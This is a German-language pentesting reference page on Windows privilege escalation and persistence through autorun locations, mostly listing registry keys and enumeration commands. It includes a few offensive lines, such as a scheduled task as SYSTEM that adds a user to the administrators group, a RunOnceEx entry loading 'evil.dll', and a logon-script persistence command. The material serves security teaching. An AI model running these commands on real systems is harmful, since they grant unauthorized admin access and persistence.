# Privilege Escalation mit Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** kann verwendet werden, um Programme beim **Start** auszuführen. Mit diesem Befehl kannst du anzeigen, welche Binärdateien beim Start ausgeführt werden sollen:

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## Geplante Aufgaben

**Aufgaben** können so geplant werden, dass sie mit einer **bestimmten Häufigkeit** ausgeführt werden. Verwende die folgenden Befehle, um zu sehen, welche Binärdateien für die Ausführung geplant sind:

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

Eine aktivierte Aufgabe, die als SYSTEM ausgeführt wird, sollte überprüft werden, selbst wenn ihre Aufgabendefinition und Aktionsdatei geschützt sind. [Der Task Scheduler benötigt Ausführungsberechtigungen für die Aufgabe, um sie bei Bedarf auszuführen](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks). Wenn ein Benutzer mit niedrigen Berechtigungen diese Berechtigung hat, solltest du die genaue Aktion untersuchen, insbesondere PowerShell-Skripte, die Active-Directory-ACLs ändern oder Kontoschutzeinstellungen zurücksetzen. Überprüfe die Einstellung `AllowDemandStart` der Aufgabe und verifiziere die Eingaben und Auswirkungen des Skripts; die Berechtigung, eine festgelegte Aufgabe zu starten, bedeutet allein nicht, dass beliebiger Code ausgeführt werden kann.

## Ordner

Alle Binärdateien in den **Startup-Ordnern werden beim Start ausgeführt**. Die üblichen Startup-Ordner sind die im Folgenden aufgeführten; der Startup-Ordner wird jedoch in der Registry angegeben. [Hier erfährst du, wo.](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

Ein Startup-Eintrag eines Benutzers mit höheren Berechtigungen kann ein geschütztes Skript starten, das wiederholt Dateien aus einem Verzeichnis öffnet, in das ein anderer Benutzer schreiben kann. Prüfe den **tatsächlichen Anmeldekontext**, das Eingabeverzeichnis des Skripts und dessen ACLs sowie die genaue Aktion, bevor du das Verzeichnis als möglichen Pfad zur Rechteausweitung einstufst. Insbesondere öffnet [`hh.exe` opens compiled HTML Help (`.chm`) files](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/about-the-html-help-executable-program) kompilierte HTML-Help-Dateien (`.chm`); ein Skript, das vom Aufrufer bereitgestellte Dateien daran übergibt, überschreitet eine Vertrauensgrenze für Inhalte, selbst wenn es den Dateinamen oder die ersten Bytes prüft. [HTML Help policies can restrict executable shortcuts](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/system-policies-for-shortcut-and-winhelp-commands), bestätige daher die installierte Richtlinie und das Verhalten mit erreichbaren Inhalten. Eine `.chm`-Erweiterung oder Magic Bytes allein belegen keine Codeausführung mit höheren Berechtigungen. Untersuche den Autorun-Eintrag, die Prozessbefehlszeile und die Pfadberechtigungen, ohne die nicht vertrauenswürdige Datei während der Erfassung zu öffnen.

Dieselbe Inhaltsgrenze besteht, wenn eine Person mit höheren Berechtigungen manuell eine `.chm`-Datei aus einem Dokumentationsordner öffnet, die ein anderer Benutzer ersetzen kann. Bestätige die konkrete Datei und die Schreibrechte auf das übergeordnete Verzeichnis, die tatsächliche Identität des Viewers und das Öffnungsereignis sowie die geltende HTML-Help-Richtlinie. Ein beschreibbarer Ordner oder die Bitte, Dokumentation zu prüfen, belegt nicht, dass die Person mit der höheren Identität vom Angreifer kontrollierte Inhalte geöffnet hat.

> **FYI**: Archive-Extraction-Path-Traversal-Schwachstellen (wie die vor WinRAR 7.13 ausgenutzte Schwachstelle – CVE-2025-8088) können dazu verwendet werden, **Payloads während der Dekomprimierung direkt in diesen Startup-Ordnern abzulegen**, was bei der nächsten Benutzeranmeldung zur Codeausführung führt. Eine ausführliche Beschreibung dieser Technik findest du hier:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registrierung

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Der Registrierungseintrag **Wow6432Node** zeigt an, dass du eine 64-Bit-Version von Windows verwendest. Das Betriebssystem nutzt diesen Schlüssel, um für 32-Bit-Anwendungen, die auf 64-Bit-Windows-Versionen ausgeführt werden, eine separate Ansicht von HKEY_LOCAL_MACHINE\SOFTWARE bereitzustellen.

### Run-Einträge

**Allgemein bekannte** AutoRun-Registrierungsschlüssel:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registrierungsschlüssel namens **Run** und **RunOnce** sind dafür vorgesehen, Programme automatisch bei jeder Benutzeranmeldung am System auszuführen. Die als Datenwert eines Schlüssels zugewiesene Befehlszeile ist auf höchstens 260 Zeichen begrenzt.<sup>[[2]](#references)</sup>

**Service-Run-Einträge** (können den automatischen Start von Diensten während des Bootvorgangs steuern):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Ab Windows Vista werden die Registrierungsschlüssel **Run** und **RunOnce** nicht automatisch erstellt. Einträge in diesen Schlüsseln können Programme entweder direkt starten oder als Abhängigkeiten angeben. Beispielsweise kann man zum Laden einer DLL-Datei bei der Anmeldung den Registrierungsschlüssel **RunOnceEx** zusammen mit einem „Depend“-Schlüssel verwenden. Dies wird demonstriert, indem ein Registrierungseintrag hinzugefügt wird, der beim Systemstart „C:\temp\evil.dll“ ausführt:<sup>[[2]](#references)</sup>

```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```

> [!TIP]
> **Exploit 1**: Wenn du in einen der erwähnten Registry-Schlüssel unter **HKLM** schreiben kannst, kannst du deine Privilegien eskalieren, wenn sich ein anderer Benutzer anmeldet.

> [!TIP]
> **Exploit 2**: Wenn du eine der Binärdateien überschreiben kannst, auf die ein Registry-Schlüssel unter **HKLM** verweist, kannst du diese Binärdatei mit einer Backdoor versehen und deine Privilegien eskalieren, wenn sich ein anderer Benutzer anmeldet.

```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```

### Startpfad

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Verknüpfungen im Ordner **Autostart** lösen automatisch den Start von Diensten oder Anwendungen bei der Benutzeranmeldung oder beim Neustart des Systems aus. Der Speicherort des Ordners **Autostart** ist für die Bereiche **Local Machine** und **Current User** in der Registry definiert. Das bedeutet, dass jede Verknüpfung, die diesen festgelegten **Autostart**-Speicherorten hinzugefügt wird, dafür sorgt, dass der verknüpfte Dienst oder das Programm nach der Anmeldung oder dem Neustart gestartet wird. Dies ist eine einfache Methode, Programme für die automatische Ausführung einzuplanen.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Wenn du einen beliebigen \[User] Shell Folder unter **HKLM** überschreiben kannst, kannst du ihn auf einen von dir kontrollierten Ordner verweisen lassen und eine Backdoor platzieren, die bei jeder Benutzeranmeldung am System ausgeführt wird und so deine Privilegien erhöht.

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```

### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Dieser benutzerspezifische Registry-Wert kann auf ein Skript oder einen Befehl verweisen, der ausgeführt wird, wenn sich der Benutzer anmeldet. Er dient hauptsächlich als **persistence**-Mechanismus, da er nur im Kontext des betroffenen Benutzers ausgeführt wird. Dennoch lohnt es sich, ihn bei Post-Exploitation-Prüfungen und Überprüfungen von Autoruns zu kontrollieren.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Wenn du diesen Wert für den aktuellen Benutzer ändern kannst, kannst du die Ausführung bei der nächsten interaktiven Anmeldung erneut auslösen, ohne Administratorrechte zu benötigen. Wenn du ihn im Hive eines anderen Benutzers ändern kannst, erhältst du möglicherweise Codeausführung, wenn sich dieser Benutzer anmeldet.

```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```

Hinweise:

- Bevorzuge vollständige Pfade zu `.bat`-, `.cmd`-, `.ps1`- oder anderen Launcher-Dateien, auf die der Zielbenutzer bereits Zugriff hat.
- Dies bleibt bis zum Entfernen des Werts auch nach dem Abmelden oder einem Neustart bestehen.
- Anders als `HKLM\...\Run` gewährt dies nicht von selbst erhöhte Rechte; es handelt sich um Persistenz im Benutzerbereich.

### Winlogon-Schlüssel

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Normalerweise ist der **Userinit**-Schlüssel auf **userinit.exe** gesetzt. Wird dieser Schlüssel jedoch geändert, wird die angegebene ausführbare Datei ebenfalls von **Winlogon** bei der Benutzeranmeldung gestartet. Ebenso sollte der **Shell**-Schlüssel auf **explorer.exe** verweisen, die die Standard-Shell von Windows ist.<sup>[[1]](#references)</sup>

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```

> [!TIP]
> Wenn Sie den Registrierungswert oder die Binärdatei überschreiben können, können Sie Ihre Berechtigungen erhöhen.

### Richtlinieneinstellungen

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Überprüfen Sie den **Run**-Schlüssel.

```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```

### AlternateShell

### Ändern der Eingabeaufforderung im abgesicherten Modus

In der Windows-Registrierung unter `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` ist standardmäßig der Wert **`AlternateShell`** auf `cmd.exe` gesetzt. Das bedeutet, dass `cmd.exe` verwendet wird, wenn Sie beim Start „Abgesicherter Modus mit Eingabeaufforderung“ auswählen (indem Sie F8 drücken). Es ist jedoch möglich, Ihren Computer so einzurichten, dass er automatisch in diesem Modus startet, ohne dass Sie F8 drücken und ihn manuell auswählen müssen.

Schritte zum Erstellen einer Startoption, mit der automatisch „Abgesicherter Modus mit Eingabeaufforderung“ gestartet wird:<sup>[[5]](#references)</sup>

1. Ändern Sie die Attribute der Datei `boot.ini`, um die Kennzeichnungen „schreibgeschützt“, „System“ und „versteckt“ zu entfernen: `attrib c:\boot.ini -r -s -h`
2. Öffnen Sie `boot.ini` zur Bearbeitung.
3. Fügen Sie eine Zeile wie diese ein: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Speichern Sie die Änderungen an `boot.ini`.
5. Stellen Sie die ursprünglichen Dateiattribute wieder her: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Durch Ändern des Registrierungsschlüssels **AlternateShell** lässt sich eine benutzerdefinierte Befehlsshell einrichten, was möglicherweise unbefugten Zugriff ermöglicht.
- **Exploit 2 (PATH-Schreibberechtigungen):** Schreibberechtigungen für einen beliebigen Teil der Systemvariable **PATH**, insbesondere vor `C:\Windows\system32`, ermöglichen die Ausführung einer benutzerdefinierten `cmd.exe`, die bei einem Start im abgesicherten Modus als Backdoor dienen könnte.
- **Exploit 3 (Schreibberechtigungen für PATH und boot.ini):** Schreibzugriff auf `boot.ini` ermöglicht den automatischen Start im abgesicherten Modus und erleichtert so den unbefugten Zugriff beim nächsten Neustart.

Um die aktuelle Einstellung von **AlternateShell** zu überprüfen, verwenden Sie diese Befehle:

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```

### Installierte Komponente

Active Setup ist eine Windows-Funktion, die **ausgeführt wird, bevor die Desktopumgebung vollständig geladen ist**. Sie priorisiert die Ausführung bestimmter Befehle, die abgeschlossen sein müssen, bevor die Benutzeranmeldung fortgesetzt wird. Dieser Prozess findet sogar statt, bevor andere Starteinträge, etwa in den Registrierungsschlüsseln Run oder RunOnce, ausgelöst werden.

Active Setup wird über die folgenden Registrierungsschlüssel verwaltet:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Unter diesen Schlüsseln befinden sich verschiedene Unterschlüssel, die jeweils einer bestimmten Komponente entsprechen. Zu den besonders relevanten Schlüsselwerten gehören:

- **IsInstalled:**
  - `0` bedeutet, dass der Befehl der Komponente nicht ausgeführt wird.
  - `1` bedeutet, dass der Befehl einmal für jeden Benutzer ausgeführt wird. Dies ist das Standardverhalten, wenn der Wert `IsInstalled` fehlt.
- **StubPath:** Legt den von Active Setup auszuführenden Befehl fest. Dabei kann es sich um eine beliebige gültige Befehlszeile handeln, beispielsweise zum Starten von `notepad`.

**Sicherheitshinweise:**

- Änderungen an oder Schreibzugriffe auf einen Schlüssel, bei dem **`IsInstalled`** auf `"1"` gesetzt ist und ein bestimmter **`StubPath`** vorhanden ist, können zur unautorisierten Befehlsausführung führen und möglicherweise eine Rechteausweitung ermöglichen.
- Auch das Ändern der Binärdatei, auf die ein beliebiger **`StubPath`**-Wert verweist, könnte bei ausreichenden Berechtigungen eine Rechteausweitung ermöglichen.

Um die **`StubPath`**-Konfigurationen der Active-Setup-Komponenten zu überprüfen, können folgende Befehle verwendet werden:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

### Browser Helper Objects

### Überblick über Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) sind DLL-Module, die Microsofts Internet Explorer um zusätzliche Funktionen erweitern. Sie werden bei jedem Start in den Internet Explorer und den Windows Explorer geladen. Ihre Ausführung kann jedoch durch Setzen des Schlüssels **NoExplorer** auf 1 blockiert werden, wodurch verhindert wird, dass sie mit Windows-Explorer-Instanzen geladen werden.<sup>[[1]](#references)</sup>

BHOs sind über Internet Explorer 11 mit Windows 10 kompatibel, werden jedoch von Microsoft Edge, dem Standardbrowser in neueren Windows-Versionen, nicht unterstützt.

Um die auf einem System registrierten BHOs zu untersuchen, können Sie die folgenden Registrierungsschlüssel überprüfen:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Jedes BHO wird in der Registrierung durch seine **CLSID** dargestellt, die als eindeutiger Bezeichner dient. Detaillierte Informationen zu jeder CLSID finden Sie unter `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Zum Abfragen von BHOs in der Registrierung können diese Befehle verwendet werden:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

### Internet Explorer-Erweiterungen

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Beachte, dass die Registry für jede DLL einen neuen Registry-Eintrag enthält, der durch die **CLSID** dargestellt wird. Die CLSID-Informationen findest du unter `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Schriftarttreiber

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```

### Öffnen-Befehl

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```

### COM-Handler für Kontextmenüs

Explorer-Handler für Kontextmenüs sind Shell-Erweiterungen, die unter Schlüsseln wie `HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers` und `HKLM\SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers` registriert sind. Der Standardwert eines Handlers oder manchmal sein Schlüsselname ist eine CLSID. Folgen Sie dieser CLSID zu `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32`; der Standardwert dort gibt die DLL an, die geladen wird, wenn der Handler aufgerufen wird.

```powershell
reg query "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers" /s
reg query "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve
Get-Acl 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32' |
  Select-Object -ExpandProperty Access
```

Prüfe sowohl die 32-Bit- als auch die 64-Bit-Registry-Ansicht. `HKCR` führt benutzerspezifische und systemweite Klassenregistrierungen zusammen. Prüfe daher, welchen zugrunde liegenden Schlüssel ein Prozess auflöst. Eine Identität mit geringen Berechtigungen, die einen systemweiten `InprocServer32`-Wert ändern kann, könnte einen Prozess mit höheren Berechtigungen zu einer anderen DLL umleiten. Für eine Privilegieneskalation muss dieser Prozess jedoch den Handler aufrufen. Ein beschreibbarer DLL-Pfad kann ein ähnliches Risiko darstellen, selbst wenn der Registry-Wert selbst geschützt ist.

### Image File Execution Options

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## SysInternals

Beachte, dass alle Speicherorte, an denen du Autoruns finden kannst, bereits von [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) durchsucht werden. Für eine **umfassendere Liste automatisch ausgeführter** Dateien kannst du jedoch [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) von Sysinternals verwenden:

```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## Mehr

**Weitere Autoruns wie Registrierungseinträge finden Sie unter** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Häufige Mechanismen zur Malware-Persistenz](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Autostart-Ausführung beim Booten oder Anmelden: Registry-Run-Keys / Startup-Ordner](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Initialisierungsskripte beim Booten oder Anmelden: Anmeldeskript (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Autostart-Kategorien (Fehlerbehebung mit den Windows-Sysinternals-Tools, 2. Auflage)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Wie kann ich eine Bootoption hinzufügen, die eine alternative Shell startet?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Metasploit-Zusammenfassung 04.03.2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
